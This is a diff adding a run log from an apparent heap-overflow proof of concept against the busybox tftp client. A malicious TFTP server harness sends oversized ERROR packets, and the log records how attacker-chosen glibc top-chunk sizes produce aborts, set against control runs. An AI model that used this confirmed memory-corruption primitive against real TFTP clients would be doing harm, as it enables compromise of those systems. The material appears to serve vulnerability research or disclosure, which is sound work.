@@ -1,0 +1,48 @@
+=== CLOCK Tue Nov 24 04:14:07 AM UTC 2026
+=== ARTIFACT
+dbac288c29ba568459550a2da9e7ae0ded6b1fc728ee9fad3044c44e62d6ac14  /usr/bin/busybox
+busybox-static 1:1.36.1-6ubuntu3.1 amd64
+=== HARNESSES
+406e9c7522f3f5bea8f3a0e71753d7791f4a6b6c22c90dd9992f18532b118191  heap_probe.py
+a9b42484936f41418a8b73b87600c8f31b63a4a145f0fb4d2750e6810bc09dd5  malicious_tftp.py
+5a42399cfe823b041c0978badd827d6ebb12b25799c4249f4ade20dd036e6cd3  run-distro.sh
+=== 1 ATTACK chosen top size 0x4141414141414141 (expect SIGABRT)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x4141414141414141 RC -6
+STDERR tftp: falling back to blocksize 512
+malloc(): corrupted top size
+
+=== 2 ISOLATION original top size 0x20cb1 (expect rc 1, no abort)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x20cb1 RC 1
+STDERR tftp: falling back to blocksize 512
+tftp: server error: (0) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+
+=== 3 VARIANT chosen top size 0x4242424242424242 (expect SIGABRT)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x4242424242424242 RC -6
+STDERR tftp: falling back to blocksize 512
+malloc(): corrupted top size
+
+=== 4 VARIANT top size 0x21 (expect sysmalloc assertion)
+REQ b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+MODE attack TOP_SIZE 0x21 RC -6
+STDERR tftp: falling back to blocksize 512
+Fatal glibc error: malloc.c:2599 (sysmalloc): assertion failed: (old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)
+
+=== 5 CONTROL no -b 64, same 516-byte ERROR (expect rc 1, no abort)
+REQ b'\x00\x01MISHE\x00octet\x00tsize\x000\x00'
+MODE control TOP_SIZE 0x4141414141414141 RC 1
+STDERR tftp: server error: (0) AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+=== 6 SAFE OACK control (expect rc 0, no fallback)
+REQ 33 bytes: b'\x00\x01MISHE\x00octet\x00blksize\x0064\x00tsize\x000\x00'
+RC 0
+STDOUT 
+STDERR 
+=== 7 SAFE DEFAULT-BLKSIZE control (expect rc 0, no fallback)
+REQ 22 bytes: b'\x00\x01MISHE\x00octet\x00tsize\x000\x00'
+RC 0
+STDOUT 
+STDERR 
+=== DONE Tue Nov 24 04:14:23 AM UTC 2026
